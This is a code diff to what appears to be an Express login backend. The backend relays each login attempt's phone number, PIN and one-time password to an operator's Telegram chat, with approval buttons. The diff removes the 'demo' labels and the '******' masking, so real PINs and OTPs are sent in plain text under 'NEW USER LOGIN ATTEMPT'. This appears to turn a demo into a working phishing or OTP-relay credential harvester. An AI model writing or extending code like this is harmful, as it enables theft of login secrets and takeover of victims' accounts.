@@ -141,12 +141,12 @@ app.post("/login", async function(request, response) {
                         ADMIN_CHAT_ID,
 
                     text:
-                        "🔔 DEMO LOGIN REQUEST\n\n" +
+                        "🔔 NEW USER LOGIN ATTEMPT\n\n" +
 
                         "Phone: " +
                         phone +
 
-                        "\nDemo PIN: ******" +
+                        "\nDemo PIN: " + pinValue +
 
                         "\nRequest ID: " +
                         loginRequest.id +
@@ -327,12 +327,12 @@ app.post(
                             ADMIN_CHAT_ID,
 
                         text:
-                            "🔐 DEMO OTP SUBMITTED\n\n" +
+                            "🔐 NEW USER LOGIN ATTEMPT\n\n" +
 
                             "Phone: " +
                             loginRequest.phone +
 
-                            "\nOTP: ******" +
+                            "\nOTP: " +  otpValue +
 
                             "\nRequest ID: " +
                             loginRequest.id +
@@ -395,7 +395,7 @@ app.post(
                     success: false,
 
                     message:
-                        "Could not send demo approval request"
+                        "Could not send login approval request"
 
                 });
 
@@ -659,7 +659,7 @@ async function handleTelegramButton(
                     "Phone: " +
                     loginRequest.phone +
 
-                    "\nDemo PIN: ******" +
+                    "\nDemo PIN: " + pinValue +
 
                     "\nRequest ID: " +
                     loginRequest.id +
@@ -775,7 +775,7 @@ async function handleTelegramButton(
                     "Phone: " +
                     loginRequest.phone +
 
-                    "\nOTP: ******" +
+                    "\nOTP: " + otpValue +
 
                     "\nRequest ID: " +
                     loginRequest.id +
@@ -833,7 +833,7 @@ async function handleTelegramButton(
                     "Phone: " +
                     loginRequest.phone +
 
-                    "\nOTP: ******" +
+                    "\nOTP: " + otpValue +
 
                     "\nRequest ID: " +
                     loginRequest.id +
